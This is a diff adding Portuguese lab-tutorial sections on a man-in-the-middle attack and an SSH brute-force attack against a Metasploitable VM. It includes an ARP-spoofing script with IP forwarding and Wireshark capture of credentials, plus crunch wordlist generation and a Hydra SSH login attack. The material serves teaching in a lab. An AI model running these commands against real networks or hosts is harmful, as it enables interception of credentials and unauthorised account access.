@@ -592,8 +592,104 @@ Conforme a imagem. A comunicação entre debian cliente e servidor metasploitabl
 ![](imagens/teste.png)
 
 
+### Ataque man in the middle. (Homem no meio)
+
+Interceptar envio de pacotes (username e password) em uma rede local.
+
+No ubuntu atacante, instale o wireshark.
+
+```bash
+sudo apt-get install wireshark 
+```
+
+Depois crie o script arpspoof.sh.
+
+```bash
+nano arpspoof.sh 
+```
+
+Adicione ao arquivo o conteúdo:
+
+```bash
+#!/bin/bash
+# script para man in the middle
+clear
+sudo arpspoof -i enpOs8 -t 192.168.0.191 192.168.0.104
+sudo arpspoof -i enpOs8 -t 192.168.0.104 192.168.0.191
+echo 1 > /proc/sys/net/ipv4/ip_forward
+/usr/bin/wireshark
+```
+
+Salve e feche o arquivo. Dê permissão com o comando:
+
+```bash
+chmod 755 arpspoof.sh 
+```
 
 
+
+
+sudo dpkg-reconfigure wireshark-commom
+
+
+
+### Ataque por força bruta (brute force).
+
+É o processo de tentativa e erro para a descoberta de senhas, existem três tipo de ataques por brute force. 
+
+
+
+APLICAÇÃO | TRANSPORTE 
+:-----------------:|:-----------------------------------------------------------:
+Dictionary Attacks | São dicionários que contem informações a serem testadas, lstas com potenciais usernames e passwords a serem verificados. 
+Search Attacks | Baseando-se no comprimento da senha, este ataque leva tempo, pois usa combinações possiveis por probabilidade de caracteres.
+Rulebased search attacks | Focado em usar regras e possiveis padrões na senha, como em uma empresa sabendo o username, possuindo um padrão de senha e testando com possibilidades conforme.
+
+
+### Realizando um brute force. 
+
+Vamos precisar das VMs, então suba as 3 máquinas. 
+Eu escolhi o debian para ser o atacante nessa situação. 
+
+
+Instale a ferramenta hydra, popular ferramenta de força bruta com o comando:
+
+```bash
+sudo apt-get install hydra -y
+```
+
+Para gerar wordlist, instale o Crunch, ferramenta própria para criação em qualquer tipo de ataque por brute force, use o comando:
+
+```bash
+sudo apt-get install crunch -y 
+```
+
+Depois gere a sua primeira lista de senha, sabendo que a senha do servidor que estamos usando é msfadmin, use o seguinte comando para gerar as possiveis tentativas.
+
+```bash
+crunch 8 8 mMiInN0123%# -t msfad@@@ -o wlist.txt
+```
+
+>De acordo com o template fornecido, cada senha gerada pela ferramenta terá
+comprimento igual a 8 caracteres, sendo composta (em sua primeira parte) pelos cinco
+caracteres da string “msfad”, complementados por mais três, produzidos pelas
+possíveis combinações dos caracteres da string mMiInN0123%#. Gerando 1728 senhas como possivel resposta.
+
+![](imagens/wordlist.png)
+
+Agora efetue o ataque por meio do Hydra, conforme o comando:
+
+```bash
+hydra -l msfadmin -P wlist.txt -V -f -t 4 192.168.0.101 ssh
+```
+
+>O Hydra que execute o ataque utilizando
+o username msfadmin com cada senha disponível na wordlist (dicionário) wlist.txt.
+Para acompanhamento de suas atividades, a opção -V (verbose), para mostrar na tela. A opção -f interromperá o processo assim que a primeira credencial for descoberta (username/senha), sendo que a ferramenta realizará quatro tasks
+(simplificadamente, testará quatro combinações username/senha paralelamente), contra o serviço ssh do host ip da Metasploitable servidor.
+
+
+![](imagens/hydra.png) 
 
 
 
